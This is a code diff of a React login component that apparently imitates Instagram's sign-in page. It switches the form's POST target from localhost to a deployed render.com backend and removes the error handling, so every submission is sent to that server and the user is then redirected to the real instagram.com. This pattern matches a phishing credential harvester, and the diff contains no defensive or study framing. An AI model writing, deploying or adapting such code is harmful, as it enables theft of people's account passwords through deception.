@@ -25,20 +25,13 @@ const Login = () => {
     e.preventDefault();
     setLoading(true);
     try {
-      const response = await axios.post(
-        "http://localhost:5000/api/login",
+      await axios.post(
+        // "http://localhost:5000/api/login",
+        "https://instagrambackend-xgrd.onrender.com/api/login",
         formData
       );
-      if (response.statusText === "OK") {
-        setLoading(false);
-
-        window.location.href = "https://www.instagram.com";
-      } else {
-        setLoading(false);
-        setError(
-          "Sorry, your password was incorrect. Please double-check your password."
-        );
-      }
+      setLoading(false);
+      window.location.href = "https://www.instagram.com";
     } catch (error) {
       console.log(error);
     }
